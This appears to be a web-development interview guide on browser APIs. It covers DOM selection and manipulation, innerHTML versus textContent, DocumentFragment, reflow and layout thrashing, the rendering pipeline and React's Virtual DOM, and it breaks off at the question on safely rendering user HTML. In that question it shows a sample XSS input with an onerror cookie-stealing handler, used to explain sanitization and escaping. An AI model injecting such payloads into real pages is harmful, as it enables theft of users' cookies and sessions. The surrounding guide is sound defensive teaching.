---
title: Browser APIs
description: The DOM, BOM, events, storage, and the Fetch API.
sidebar_position: 21
---

# Browser APIs

## DOM (Document Object Model)

## 1. What is the DOM, why do we need it, how does it differ from HTML, how does the browser create it, and what are DOM Nodes?

### 📖 Overview

The **DOM (Document Object Model)** is a **live, in-memory tree structure** that the browser builds from an HTML document. It represents every tag, piece of text, and attribute in the page as an **object** that JavaScript can read, change, add, or remove.

In simple words:

> HTML is the file you write. The DOM is what the browser turns that file into inside memory, so that JavaScript can talk to the page.

---

### 🎯 Why Do We Need the DOM?

Without the DOM, JavaScript would have no way to interact with a web page. The DOM gives JavaScript the ability to:

- Read and update page content dynamically (without reloading the page).
- Respond to user actions like clicks, typing, and scrolling.
- Change styles, classes, and attributes at runtime.
- Add or remove elements based on application state.

This is what makes web pages **interactive** instead of static documents.

---

### ⚖️ HTML vs DOM

| HTML | DOM |
|------|-----|
| A text file written by the developer. | An object tree built by the browser from that file. |
| Static — doesn't change on its own. | Live — can be changed by JavaScript at any time. |
| What you see in "View Page Source". | What you see in DevTools "Elements" tab (this reflects current DOM state, which may differ from the original HTML). |
| Not directly accessible by JavaScript. | Fully accessible and modifiable via JavaScript. |

> 💡 **Note**
>
> If JavaScript changes the DOM (for example, adds a new `<div>`), "View Page Source" still shows the **original HTML**, but DevTools shows the **updated DOM**. This proves the DOM and HTML are not the same thing.

---

### ⚙️ How Does the Browser Create the DOM?

When the browser loads an HTML file, it doesn't just display the text. It **parses** it and builds a tree of objects.

Step by step:

1. The browser downloads the HTML file.
2. The **HTML parser** reads it character by character.
3. Every tag (`<div>`, `<p>`, `<img>`, etc.) becomes a **Node object**.
4. Nodes are connected as **parent, child, and sibling** relationships, matching how tags are nested in the HTML.
5. The result is the **DOM Tree**, stored in memory and exposed to JavaScript through the global `document` object.

Example HTML:

```html
<html>
  <body>
    <h1>Hello</h1>
    <p>World</p>
  </body>
</html>
```

Resulting DOM tree:

```
document
  └── html
        └── body
              ├── h1
              │     └── "Hello" (text node)
              └── p
                    └── "World" (text node)
```

---

### 🏗️ What Are DOM Nodes?

Every single item in the DOM tree — an element, a piece of text, a comment, even the document itself — is called a **Node**.

Common node types:

| Node Type | Example |
|-----------|---------|
| **Element Node** | `<div>`, `<p>`, `<img>` |
| **Text Node** | The actual text inside an element |
| **Comment Node** | `<!-- comment -->` |
| **Document Node** | The root `document` object |
| **Attribute** (accessed via the element, not a child node in modern DOM) | `id="app"`, `class="box"` |

All node types inherit from a base type called `Node`, which is why methods like `.parentNode`, `.childNodes`, and `.nodeType` work on all of them. `Element` is a more specific type that adds things like `.classList`, `.id`, and `.querySelector()` — only element nodes have these.

---

### 🎤 Interview Answer

The DOM is a live tree of objects that the browser builds from an HTML document. HTML is just the static text file; the DOM is the browser's in-memory representation of it, which JavaScript can read and modify. The browser builds it by parsing the HTML tag by tag and creating a Node for each tag, text piece, or comment, connecting them based on their nesting. Because the DOM is a JavaScript-accessible object tree, we can dynamically update content, styles, and structure without reloading the page.

---

### ❓ Follow-up Questions

- What is the difference between `Node` and `Element`?
- What is the difference between the DOM and the CSSOM?
- Is the DOM part of JavaScript?
- What happens if JavaScript modifies the DOM before the HTML has fully loaded?

---

## 2. How do you select DOM elements, and what is the difference between `getElementById()`, `getElementsByClassName()`, `getElementsByTagName()`, `querySelector()`, and `querySelectorAll()`?

### 📖 Overview

Before you can read or change anything on a page, you need to **select** the element(s) you want to work with. The DOM provides several built-in methods for this, and they differ in **what they accept as input**, **what they return**, and **whether the result stays "live" as the page changes**.

---

### ⚙️ The Selector Methods

```js
document.getElementById("app");
document.getElementsByClassName("box");
document.getElementsByTagName("li");
document.querySelector(".box");
document.querySelectorAll(".box");
```

| Method | Accepts | Returns | Live or Static |
|--------|---------|---------|-----------------|
| `getElementById()` | An ID (no `#`) | A single `Element` or `null` | N/A (single element) |
| `getElementsByClassName()` | A class name (no `.`) | `HTMLCollection` | **Live** |
| `getElementsByTagName()` | A tag name (`"div"`, `"li"`) | `HTMLCollection` | **Live** |
| `querySelector()` | Any CSS selector | The **first** matching `Element` or `null` | N/A (single element) |
| `querySelectorAll()` | Any CSS selector | `NodeList` | **Static** (snapshot) |

---

### 🔑 Key Differences Explained

#### 1. CSS Selector Power

`querySelector()` and `querySelectorAll()` accept **any valid CSS selector** — classes, IDs, attributes, pseudo-classes, combinators:

```js
document.querySelector("ul > li:first-child");
document.querySelectorAll("input[type='text']");
```

The older `getElementBy...` methods only accept exactly one thing (an ID, a class name, or a tag name) — no combinators, no pseudo-classes.

#### 2. Live vs Static Collections

This is the most commonly misunderstood difference.

- `HTMLCollection` (from `getElementsByClassName`/`getElementsByTagName`) is **live** — it automatically updates if matching elements are added or removed from the DOM.
- `NodeList` from `querySelectorAll()` is **static** — it's a snapshot taken at the time you called it. Changes to the DOM afterward won't be reflected in that list.

```js
const liveList = document.getElementsByClassName("item");
console.log(liveList.length); // e.g. 2

document.body.insertAdjacentHTML("beforeend", '<div class="item"></div>');
console.log(liveList.length); // 3 — automatically updated!

const staticList = document.querySelectorAll(".item");
console.log(staticList.length); // 3

document.body.insertAdjacentHTML("beforeend", '<div class="item"></div>');
console.log(staticList.length); // still 3 — snapshot, doesn't update
```

> ⚠️ Live collections can cause subtle bugs (and even infinite loops) if you add/remove matching elements while iterating over them. Prefer `querySelectorAll()` in most modern code for predictability.

#### 3. Return Type and Array Methods

`NodeList` (from `querySelectorAll`) supports `.forEach()` directly in modern browsers, but **not** `.map()` or `.filter()` unless you convert it:

```js
const items = document.querySelectorAll(".item");
items.forEach((el) => console.log(el));

// To use array methods:
const itemsArray = Array.from(items);
// or
const itemsArray2 = [...items];
```

`HTMLCollection` doesn't even support `.forEach()` directly — it must be converted to an array first.

---

### 🎤 Interview Answer

`getElementById`, `getElementsByClassName`, and `getElementsByTagName` are older methods that accept only one specific kind of selector and return live collections that auto-update as the DOM changes. `querySelector` and `querySelectorAll` are newer, accept any CSS selector, and are generally preferred — `querySelector` returns the first match, and `querySelectorAll` returns a static `NodeList` snapshot that won't change even if the DOM changes afterward. In modern code, `querySelector`/`querySelectorAll` are used almost everywhere because of their flexibility and predictable (static) behavior.

---

### ❓ Follow-up Questions

- Why can live `HTMLCollection`s cause bugs when looping and modifying the DOM at the same time?
- How do you convert a `NodeList` or `HTMLCollection` into a real array?
- Does `querySelectorAll` work with pseudo-classes like `:hover`?
- What does `querySelector` return if nothing matches?

---

## 3. How do you create, insert, replace, clone, remove, and traverse DOM elements?

### 📖 Overview

Beyond selecting existing elements, the DOM API lets you build and rearrange the page: create new nodes, place them in specific spots, duplicate existing ones, delete them, and walk up/down/sideways through the tree.

---

### ⚙️ Creating Elements

```js
const div = document.createElement("div");
div.textContent = "Hello";

const textNode = document.createTextNode("Just text");
```

`createElement()` builds a new element node that exists **only in memory** until you insert it into the document.

---

### ⚙️ Inserting Elements

```js
const parent = document.getElementById("container");
const child = document.createElement("p");

parent.appendChild(child);          // add as the last child
parent.prepend(child);              // add as the first child (modern)
parent.append(child);               // like appendChild, but accepts text/multiple nodes too
parent.insertBefore(child, parent.firstChild); // insert before a specific reference node

// Modern, flexible positioning:
parent.insertAdjacentElement("beforeend", child);
```

`insertAdjacentElement()` / `insertAdjacentHTML()` accept a position keyword:

| Position | Meaning |
|----------|---------|
| `"beforebegin"` | Before the element itself |
| `"afterbegin"` | Inside the element, before its first child |
| `"beforeend"` | Inside the element, after its last child |
| `"afterend"` | After the element itself |

---

### ⚙️ Replacing Elements

```js
const oldEl = document.getElementById("old");
const newEl = document.createElement("div");

oldEl.replaceWith(newEl);              // modern, simple
oldEl.parentNode.replaceChild(newEl, oldEl); // older syntax
```

---

### ⚙️ Cloning Elements

```js
const original = document.getElementById("card");

const shallowClone = original.cloneNode(); // clones the element only, no children
const deepClone = original.cloneNode(true); // clones the element AND all its children
```

> 💡 `cloneNode()` copies attributes and structure, but **not** event listeners attached with `addEventListener()`. You need to reattach listeners on the clone.

---

### ⚙️ Removing Elements

```js
const el = document.getElementById("box");

el.remove();                     // modern, simple
el.parentNode.removeChild(el);   // older syntax, needs the parent
```

---

### ⚙️ Traversing the DOM

Once you have one element, you can move around the tree relative to it:

```js
el.parentNode;        // parent (any node type)
el.parentElement;     // parent (element only, null if parent isn't an element)

el.children;          // HTMLCollection of element children only
el.childNodes;        // NodeList of ALL child nodes (including text/comment nodes)

el.firstElementChild;
el.lastElementChild;

el.nextElementSibling;
el.previousElementSibling;
```

| Property | Includes text/comment nodes? |
|----------|-------------------------------|
| `childNodes` | ✅ Yes |
| `children` | ❌ No — elements only |

> 💡 In practice, prefer the `...Element...` versions (`children`, `firstElementChild`, `nextElementSibling`) — they skip whitespace text nodes that often exist between tags in your HTML source, which is usually what you want.

---

### 🎤 Interview Answer

You create elements with `document.createElement()`, then insert them using `appendChild()`, `append()`, `prepend()`, `insertBefore()`, or `insertAdjacentElement()` depending on the exact position needed. `replaceWith()` swaps one element for another, `cloneNode(true)` deep-copies an element and its children (but not its event listeners), and `remove()` deletes an element from the DOM. To move around the tree, you use traversal properties like `parentElement`, `children`, `firstElementChild`, and `nextElementSibling` — the element-only versions are usually preferred because they skip stray text nodes.

---

### ❓ Follow-up Questions

- Why doesn't `cloneNode()` copy event listeners?
- What's the difference between `children` and `childNodes`?
- When would you use `insertAdjacentHTML` instead of `createElement` + `appendChild`?
- Is `el.remove()` supported in all browsers, or do you need a fallback?

---

## 4. How do you modify element content and styles, and what is the difference between `innerHTML`, `innerText`, `textContent`, and the `classList` API?

### 📖 Overview

There are several ways to read or change what's inside an element, and they behave very differently — especially around **security**, **performance**, and whether they respect **CSS-hidden content**.

---

### ⚖️ innerHTML vs innerText vs textContent

| Feature | `innerHTML` | `innerText` | `textContent` |
|---------|-------------|-------------|----------------|
| Parses HTML tags | ✅ Yes | ❌ No (shown as plain text) | ❌ No (shown as plain text) |
| Returns hidden text (`display:none`) | ✅ Yes | ❌ No | ✅ Yes |
| Triggers reflow to compute style-aware text | ❌ No | ✅ Yes (slower) | ❌ No |
| Security risk (XSS) | ⚠️ Yes, if given untrusted input | ✅ Safe | ✅ Safe |
| Typical use | Inserting HTML markup | Reading visible, human-facing text | Reading/writing plain text quickly |

```js
el.innerHTML = "<strong>Bold</strong>"; // renders as bold text
el.innerText = "<strong>Bold</strong>"; // renders literal text "<strong>Bold</strong>"
el.textContent = "<strong>Bold</strong>"; // also renders literal text
```

> ⚠️ **Security Note**
>
> Setting `innerHTML` with data that comes from a user (a comment, a search query, a URL parameter) can lead to **XSS (Cross-Site Scripting)** attacks, because any `<script>` or event-handler attributes in that string can execute. Use `textContent` for plain text, or sanitize the HTML first. We cover this in detail in Question 10.

`innerText` is also noticeably slower than `textContent` because the browser has to calculate the *rendered* text (respecting CSS like `display: none`, `text-transform`, line breaks from `<br>`), which requires a layout pass. `textContent` just returns the raw text nodes with no rendering logic involved.

---

### ⚙️ Modifying Styles

```js
el.style.color = "red";
el.style.backgroundColor = "black"; // camelCase for hyphenated CSS properties

el.style.cssText = "color: red; font-size: 20px;"; // set multiple styles at once (overwrites existing inline styles)
```

Direct `.style` changes are fine for one-off dynamic values (like a computed height), but for anything reusable, toggling a CSS class is the better practice — it keeps styling in CSS files, not scattered in JS.

---

### ⚙️ The `classList` API

```js
el.classList.add("active");
el.classList.remove("active");
el.classList.toggle("active");        // adds if missing, removes if present
el.classList.toggle("active", isOn);  // force add/remove based on a boolean
el.classList.contains("active");      // true/false
el.classList.replace("old", "new");
```

`classList` is preferred over manually editing `el.className` (a plain string) because it avoids accidentally overwriting other classes and handles duplicates/whitespace correctly.

```js
// Error-prone:
el.className = el.className + " active"; // easy to introduce bugs (extra spaces, duplicates)

// Safer:
el.classList.add("active");
```

---

### 🎤 Interview Answer

`innerHTML` parses and renders a string as HTML — powerful, but risky with untrusted input because it can execute scripts (XSS). `textContent` reads or writes raw text without any HTML parsing and is fast and safe. `innerText` looks similar to `textContent` but respects CSS rendering — it ignores hidden elements and triggers a layout calculation, making it slower. For styling, one-off inline changes go through `el.style`, but toggling predefined CSS classes with `classList.add/remove/toggle` is the safer, more maintainable approach compared to manually editing `className` as a string.

---

### ❓ Follow-up Questions

- Why is `innerHTML` considered a security risk?
- Why is `innerText` slower than `textContent`?
- How would you safely insert user-provided content into the DOM?
- What happens if you set `innerHTML` to an empty string — does it remove event listeners on the children?

---

## 5. What is a Document Fragment, why is it useful, and how does it improve DOM performance?

### 📖 Overview

A **`DocumentFragment`** is a lightweight, **in-memory container** for DOM nodes that is **not part of the visible page**. You can build a whole tree of elements inside it, and when you finally insert the fragment into the real DOM, only **one** insertion/reflow happens — no matter how many elements are inside it.

```js
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
  const li = document.createElement("li");
  li.textContent = `Item ${i}`;
  fragment.appendChild(li);
}

document.getElementById("list").appendChild(fragment);
```

---

### 🎯 Why Is It Useful?

Every time you insert a node **directly** into a live DOM tree that's attached to the page, the browser potentially has to recalculate layout and repaint. If you insert 1,000 items one at a time in a loop:

```js
// ❌ Slow — 1,000 separate insertions into the live DOM
for (let i = 0; i < 1000; i++) {
  const li = document.createElement("li");
  li.textContent = `Item ${i}`;
  list.appendChild(li); // touches the live DOM 1,000 times
}
```

...the browser may trigger reflow/repaint work up to 1,000 times.

With a `DocumentFragment`, all 1,000 elements are built **off-screen**, and only the final `appendChild(fragment)` touches the live DOM — just **one** reflow.

> 💡 When a `DocumentFragment` is appended, only its **children** are moved into the DOM — the fragment itself disappears and is never part of the visible tree.

---

### ⚙️ How It Improves Performance

| Without Fragment | With Fragment |
|-------------------|----------------|
| Each `appendChild()` call touches the live, rendered DOM | Nodes are built in memory, detached from the page |
| Potentially triggers reflow/repaint per insertion | Triggers reflow/repaint only once, at final insertion |
| Slower for bulk updates | Much faster for bulk updates |

---

### 🌍 Real-World Example

Imagine moving furniture into a house.

- **Without a fragment**: You carry one chair at a time into the house, and every time you walk in, the family has to rearrange the room to make space. That's 20 rearrangements for 20 chairs.
- **With a fragment**: You first load all 20 chairs onto a truck (off-site, doesn't affect the house), then bring the whole truck in and unload once. The room is rearranged only once.

---

### 🎤 Interview Answer

A `DocumentFragment` is an in-memory, lightweight container that holds DOM nodes without being part of the rendered page. It's useful for batch DOM updates — you build all the new elements inside the fragment first, then insert the fragment into the real DOM in a single operation. Because only that single insertion touches the live, rendered tree, the browser needs to perform reflow and repaint only once instead of once per element, which significantly improves performance for bulk updates like rendering long lists.

---

### ❓ Follow-up Questions

- What happens to the fragment itself after you append it to the DOM?
- How does this compare to setting `innerHTML` once with a big HTML string?
- Would using a `DocumentFragment` still help if you're only inserting 2-3 elements?
- How do frameworks like React avoid this problem entirely?

---

## 6. What are Reflow, Repaint, and Layout Thrashing, what causes them, and how can they be avoided?

### 📖 Overview

**Reflow** (also called layout) and **Repaint** are two expensive steps the browser performs to update what you see on screen. **Layout Thrashing** is a performance bug where code forces the browser to repeat these expensive steps over and over, unnecessarily, in a tight loop.

---

### ⚙️ Reflow (Layout)

**Reflow** is the process where the browser recalculates the **position and size** of elements on the page.

It's triggered when something changes that could affect layout, such as:

- Adding/removing DOM elements.
- Changing an element's width, height, margin, padding, or border.
- Changing the browser window size.
- Changing font size.
- Reading certain layout properties (see below).

Reflow is expensive because changing one element's size can cascade — its siblings, parent, and even the whole page might need to be repositioned.

---

### ⚙️ Repaint

**Repaint** happens when an element's **appearance** changes but its **layout/position does not** — for example, changing `color`, `background-color`, or `visibility`.

Repaint is generally **cheaper** than reflow because the browser doesn't need to recalculate geometry, only redraw pixels.

> 💡 Changing `opacity` or `transform` can often be handled by the **compositor** alone (skipping both layout and paint), which is why they're preferred for animations. More on this in Question 8.

---

### ⚙️ Layout Thrashing

**Layout Thrashing** (also called "forced synchronous layout") happens when JavaScript **repeatedly writes then reads** layout-triggering properties in a loop, forcing the browser to recalculate layout over and over inside a single script execution — instead of just once at the end.

```js
// ❌ Causes layout thrashing
const boxes = document.querySelectorAll(".box");

boxes.forEach((box) => {
  box.style.width = box.offsetWidth + 10 + "px"; // write, then read, then write, then read...
});
```

Here's why this is slow: `.offsetWidth` is a property that **forces the browser to flush any pending layout changes first**, so it can give you an accurate number. If you just wrote a new `style.width` on the previous line, the browser can't use a cached value — it must recalculate layout **right now** before it can answer `.offsetWidth`. Doing this in a loop means the browser recalculates layout **once per iteration** instead of once at the end.

Other properties that force this synchronous layout flush include: `offsetTop`, `offsetLeft`, `offsetHeight`, `clientWidth`, `clientHeight`, `scrollTop`, `getComputedStyle()`, and `getBoundingClientRect()`.

---

### ✅ How to Avoid Reflow/Repaint Issues and Layout Thrashing

1. **Batch reads, then batch writes** — never interleave them:

```js
// ✅ Read all widths first
const widths = Array.from(boxes).map((box) => box.offsetWidth);

// ✅ Then write all changes
boxes.forEach((box, i) => {
  box.style.width = widths[i] + 10 + "px";
});
```

2. **Use a `DocumentFragment`** for bulk DOM insertions (see Question 5).
3. **Change classes instead of individual style properties** — one class change is one style recalculation, versus setting five inline properties one by one.
4. **Take elements out of the layout flow while animating** — for example, using `position: absolute` or `transform`/`opacity` (compositor-only properties) instead of animating `width`, `top`, or `left`.
5. **Use `requestAnimationFrame()`** for visual updates so they're synced with the browser's repaint cycle instead of firing at arbitrary times.

---

### 🌍 Real-World Example

Imagine rearranging furniture in a room and asking someone to take a measurement **after every single item you move**, instead of moving everything first and measuring once at the end. Constantly stopping to measure (reflow) after each small change wastes a huge amount of time compared to doing all the moving first, then measuring once.

---

### 🎤 Interview Answer

Reflow is the browser recalculating the position and size of elements — triggered by things like DOM changes or size/margin updates. Repaint is redrawing pixels when appearance changes without affecting layout, like color changes — it's cheaper than reflow. Layout Thrashing happens when code alternates writing a layout-affecting style and then immediately reading a layout property like `offsetWidth`, forcing the browser to recalculate layout synchronously on every iteration of a loop. It's avoided by batching all DOM reads together and all DOM writes together, using `DocumentFragment` for bulk changes, toggling CSS classes instead of individual styles, and preferring `transform`/`opacity` for animations since those can often be handled by the compositor alone.

---

### ❓ Follow-up Questions

- Why does reading `offsetWidth` force a layout recalculation?
- Why are `transform` and `opacity` cheaper to animate than `width` or `top`?
- What is the browser's rendering pipeline, step by step?
- How would you detect layout thrashing in a real application?

---

## 7. How would you optimize heavy DOM updates, and what are the best practices for efficient DOM manipulation?

### 📖 Overview

DOM operations are among the most expensive things JavaScript can do, because they can trigger layout and paint work (see Question 6). When an application needs to make many DOM changes — rendering a big list, updating a live dashboard, redrawing a table — a few key techniques keep things fast.

---

### ✅ Best Practices

#### 1. Batch DOM Changes

Group multiple changes together instead of touching the live DOM repeatedly. Use a `DocumentFragment`, or build an HTML string and set `innerHTML` once.

```js
// ✅ One reflow instead of many
let html = "";
items.forEach((item) => {
  html += `<li>${item}</li>`;
});
list.innerHTML = html;
```

> ⚠️ Only do this with trusted/escaped data — see Question 10 on XSS.

#### 2. Detach Before Heavy Updates

If you need to make many changes to an element already on the page, remove it from the DOM first, modify it, then reattach it. While detached, the browser doesn't need to recalculate layout for it.

```js
const list = document.getElementById("list");
const parent = list.parentNode;
const next = list.nextSibling;

parent.removeChild(list); // detach

// ... make many changes to `list` here ...

parent.insertBefore(list, next); // reattach
```

#### 3. Avoid Layout Thrashing

Batch all reads together, then all writes together (see Question 6).

#### 4. Use Event Delegation Instead of Many Listeners

Instead of attaching a click listener to every item in a list of 1,000 rows, attach **one** listener to the parent (see Question 16).

#### 5. Cache DOM References

Don't call `querySelector()` repeatedly for the same element inside a loop or a frequently-called function.

```js
// ❌ Re-queries the DOM every call
function updateTitle() {
  document.querySelector(".title").textContent = "New Title";
}

// ✅ Query once, reuse
const titleEl = document.querySelector(".title");
function updateTitle() {
  titleEl.textContent = "New Title";
}
```

#### 6. Debounce or Throttle High-Frequency Updates

Events like `scroll`, `resize`, and `input` can fire dozens of times per second. Updating the DOM on every single firing is wasteful — debounce or throttle the handler.

#### 7. Use `requestAnimationFrame()` for Visual Updates

Schedule DOM writes that affect visuals right before the browser's next repaint, so they sync naturally with the rendering cycle instead of causing extra unnecessary layout work.

#### 8. Virtualize Long Lists

For very large lists (thousands of rows), only render the items currently visible in the viewport ("windowing" / "virtualization"), and swap content in/out as the user scrolls, instead of creating thousands of real DOM nodes.

#### 9. Prefer CSS Classes Over Inline Styles

Toggling one class is one style recalculation trigger; setting five individual inline style properties is five potential triggers.

---

### 🎤 Interview Answer

To optimize heavy DOM updates: batch changes using a `DocumentFragment` or a single `innerHTML` write instead of many individual DOM calls, detach an element before making many changes to it and reattach it after, avoid layout thrashing by separating reads and writes, cache element references instead of re-querying, use event delegation instead of many individual listeners, debounce/throttle high-frequency events like scroll and resize, use `requestAnimationFrame()` to sync visual updates with the browser's paint cycle, and virtualize very long lists so you're not creating thousands of real DOM nodes at once.

---

### ❓ Follow-up Questions

- What is list virtualization/windowing, and when is it necessary?
- How does detaching an element from the DOM before editing it help performance?
- What's the difference between debounce and throttle?
- Why is event delegation more efficient for large lists?

---

## 8. How does the browser construct the DOM tree and rendering pipeline (DOM → CSSOM → Render Tree → Layout → Paint → Composite)?

### 📖 Overview

Turning an HTML/CSS file into pixels on screen is a multi-stage pipeline. Understanding these stages explains **why** certain operations (like animating `width`) are slow, and others (like animating `transform`) are fast.

---

### 🏗️ The Full Pipeline

```
HTML  ──parse──▶  DOM Tree
CSS   ──parse──▶  CSSOM Tree
                      │
        DOM + CSSOM combine
                      ▼
                Render Tree
                      │
                   Layout
              (calculate position & size)
                      │
                    Paint
           (fill in pixels: color, text, images)
                      │
                  Composite
        (layers combined and drawn to the screen)
```

---

### ⚙️ Step by Step

#### 1. DOM Construction

The browser parses the HTML into the DOM tree, as covered in Question 1.

#### 2. CSSOM Construction

The browser parses all CSS (external stylesheets, `<style>` tags, inline styles) into the **CSSOM (CSS Object Model)** — a tree representing every style rule and its computed values.

> 💡 CSS parsing **blocks rendering** by default — the browser won't paint anything until it has the full CSSOM, because a style defined lower in a stylesheet could override one defined earlier.

#### 3. Render Tree Construction

The browser combines the DOM and CSSOM into a **Render Tree** — a tree containing only the nodes that will actually be **visible** on the page, each attached with its final computed styles.

Nodes with `display: none` are **excluded** entirely from the render tree (though they still exist in the DOM). Note: `visibility: hidden` elements **are** included in the render tree — they still take up space, just aren't drawn.

#### 4. Layout (Reflow)

The browser walks the render tree and calculates the **exact position and size** (in pixels) of every visible element, based on the viewport size, box model, and CSS rules. This is the "Reflow" step discussed in Question 6.

#### 5. Paint

The browser fills in actual pixels for each element: text, colors, borders, shadows, images — based on the geometry computed during Layout.

#### 6. Composite

Modern browsers split the page into **layers** (for example, an element with `will-change: transform` or `position: fixed` may get its own layer). The **Compositor** thread combines these layers in the correct order and draws the final image to the screen.

> 💡 Certain properties — most importantly `transform` and `opacity` — can be handled **entirely by the compositor**, skipping Layout and Paint completely. This is why animating `transform: translateX()` is much smoother than animating `left` or `margin-left`, which force Layout on every frame.

---

### ⚖️ Cost Comparison

| Change | Triggers |
|--------|----------|
| `width`, `height`, `margin`, adding/removing DOM nodes | Layout → Paint → Composite (most expensive) |
| `color`, `background`, `visibility` | Paint → Composite |
| `transform`, `opacity` | Composite only (cheapest) |

---

### 🎤 Interview Answer

The browser first parses HTML into the DOM tree and CSS into the CSSOM tree. These two are combined into a Render Tree, which contains only the visible nodes along with their final computed styles — elements with `display: none` are excluded. The browser then runs Layout to calculate each element's exact position and size, Paint to fill in pixels like color and text, and finally Composite, where separate layers are combined by the compositor thread and drawn to the screen. Properties like `transform` and `opacity` can skip Layout and Paint entirely and be handled by the compositor alone, which is why they're the preferred choice for smooth animations.

---

### ❓ Follow-up Questions

- Why does changing `display: none` affect the render tree differently than `visibility: hidden`?
- Why is CSS considered render-blocking?
- Why are `transform` and `opacity` cheaper to animate than `top`/`left`?
- What is a compositor layer, and how does an element get promoted to its own layer?

---

## 9. How do modern frameworks reduce DOM manipulation, what is the Virtual DOM, how does it differ from the Real DOM, and when is direct DOM manipulation appropriate in React?

### 📖 Overview

Direct DOM manipulation is expensive (Question 6, 8). Frameworks like React introduced the **Virtual DOM** — a lightweight, in-memory copy of the real DOM — to minimize how much they actually touch the real, rendered page.

---

### ⚙️ What Is the Virtual DOM?

The **Virtual DOM (VDOM)** is a plain JavaScript object tree that mirrors the structure of the real DOM, but is **not** connected to the browser's rendering engine. It's cheap to create and compare because it's just JavaScript objects in memory — no layout, no paint, no browser rendering involved.

```js
// Roughly what a Virtual DOM node looks like internally
{
  type: "div",
  props: { className: "box" },
  children: [
    { type: "p", props: {}, children: ["Hello"] }
  ]
}
```

---

### ⚙️ How It Works (Reconciliation)

1. When state changes, React builds a **new** Virtual DOM tree representing the updated UI.
2. React compares (**"diffs"**) the new Virtual DOM tree against the **previous** Virtual DOM tree.
3. React calculates the **minimal set of changes** needed to make the real DOM match the new Virtual DOM (this process is called **reconciliation**).
4. React applies only those specific changes to the **real DOM**, in a single batch.

```
State Changes
      │
      ▼
New Virtual DOM Tree Created
      │
      ▼
Diff Against Previous Virtual DOM Tree
      │
      ▼
Calculate Minimal Set of Real Changes
      │
      ▼
Apply Batched Changes to Real DOM
```

---

### ⚖️ Virtual DOM vs Real DOM

| Feature | Real DOM | Virtual DOM |
|---------|----------|--------------|
| What it is | Actual browser structure tied to rendering | Plain JS object tree, in memory only |
| Update cost | Can trigger layout/paint on every change | Cheap — just object comparisons |
| Direct updates | Every change can be expensive | Changes are batched and minimized before touching the real DOM |
| Who manages it | The browser | The framework (e.g., React) |

> 💡 The Virtual DOM doesn't make DOM updates "free" — it makes them **fewer and more targeted**, by batching many small state changes into one efficient real-DOM update instead of many separate ones.

---

### 🌍 Real-World Example

Imagine editing a 500-page document by hand versus using "track changes" in a word processor:

- **Without Virtual DOM**: Every edit is immediately retyped into the final printed document — slow and error-prone.
- **With Virtual DOM**: You make all your edits in a draft copy first. The software compares the draft to the original, figures out exactly which lines changed, and updates only those lines in the final document.

---

### ⚙️ When Is Direct DOM Manipulation Appropriate in React?

React manages the DOM for you, and manually manipulating it (e.g., with `document.querySelector` inside a component) can conflict with React's own updates and cause bugs. Direct DOM access is appropriate only in specific cases, using **refs** (`useRef`):

- Managing focus, text selection, or media playback (`inputRef.current.focus()`, `videoRef.current.play()`).
- Integrating with third-party non-React libraries that need a real DOM node (e.g., a charting library).
- Measuring an element's size/position (`getBoundingClientRect()`) for things React doesn't track, like scroll position.
- Triggering imperative animations that aren't well suited to declarative state.

```jsx
function SearchBox() {
  const inputRef = useRef(null);

  useEffect(() => {
    inputRef.current.focus(); // direct DOM manipulation via ref — acceptable here
  }, []);

  return <input ref={inputRef} />;
}
```

> ⚠️ You should never manually add/remove/modify elements that React itself renders and controls — doing so causes React's internal Virtual DOM to become out of sync with the real DOM, leading to unpredictable bugs.

---

### 🎤 Interview Answer

The Virtual DOM is a lightweight, in-memory JavaScript representation of the UI. When state changes, React builds a new Virtual DOM tree, diffs it against the previous one, calculates the minimal set of real changes needed, and applies only those changes to the real DOM in a batch — instead of manipulating the real DOM directly on every state change, which would be expensive. Direct DOM manipulation is still appropriate in React for specific escape hatches accessed through refs — like managing focus, integrating third-party DOM libraries, or measuring element size — but you should never directly modify elements that React itself renders, since that would desync React's internal state from the real DOM.

---

### ❓ Follow-up Questions

- What is reconciliation, and what algorithm does React use for diffing?
- Why does React ask you to provide a `key` prop when rendering lists?
- Does the Virtual DOM make React inherently faster than plain JavaScript DOM manipulation?
- What are refs, and how do they differ from state?

---

## 10. How would you safely render user-generated HTML?

### 📖 Overview

Rendering content that comes from users (comments, bios, markdown, rich text) is a common requirement — and a common source of **XSS (Cross-Site Scripting)** vulnerabilities if done carelessly.

---

### ⚠️ The Problem

```js
// ❌ Dangerous: directly inserting untrusted input
const comment = getUserInput(); // e.g. <img src=x onerror="stealCookies()">
commentBox.innerHTML = comment;
```

If `comment` contains a `<script>` tag or an event-handler attribute like `onerror`, the browser will **execute it** as if it were code written by the site itself — giving an attacker the ability to steal cookies/tokens, redirect users, or perform actions on their behalf.

---

### ✅ Safe Approaches

#### 1. Prefer `textContent` for Plain Text

If you don't actually need to render HTML — just text — use `textContent`. It never parses HTML, so there's no injection risk at all.

```js
commentBox.textContent = comment; // "<script>...</script>" is shown as literal text, not executed
```

#### 2. Sanitize Before Using `innerHTML`

If you genuinely need to render rich HTML (e.g., a rich-text editor's output), run it through a trusted **sanitization library** first, such as **DOMPurify**, which strips dangerous tags/attributes (`<script>`, `onerror`, `javascript:` URLs) while keeping safe formatting tags.

```js
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(userHtml);
commentBox.innerHTML = clean;
```

> ⚠️ Never write your own sanitizer with regex or basic string replacement — HTML parsing edge cases are notoriously easy to get wrong, and attackers are very good at finding bypasses. Always use a well-maintained, audited library.

#### 3. Let the Framework Escape by Default

Modern frameworks escape content automatically when you bind it through normal templating — this is the safe default:

```jsx
// React automatically escapes this — safe by default
<div>{userComment}</div>

// Only bypasses escaping if you explicitly opt in — should ring alarm bells
<div dangerouslySetInnerHTML={{ __html: userComment }} />
```

React's `dangerouslySetInnerHTML` is intentionally named to warn you: only use it with content that has already been sanitized.

#### 4. Enforce a Content Security Policy (CSP)

As a defense-in-depth layer, a **CSP** HTTP header can block inline scripts from executing even if malicious HTML slips through, adding a second line of defense beyond sanitization.

#### 5. Sanitize on the Server Too

Client-side sanitization protects the browser rendering the content, but you should also sanitize/validate on the **server** before storing user content — this protects any other consumer of that data (mobile apps, other services, admin panels).

---

### ⚖️ Quick Decision Guide

| Situation | Approach |
|-----------|----------|
| Displaying plain user text (name, comment, search query) | `textContent` / framework's default text binding |
| Displaying user-authored rich text (bold, links, etc.) | Sanitize with DOMPurify (or similar), then render |
| Rendering trusted, developer-authored HTML | `innerHTML` is fine — it's not attacker-controlled |

---

### 🎤 Interview Answer

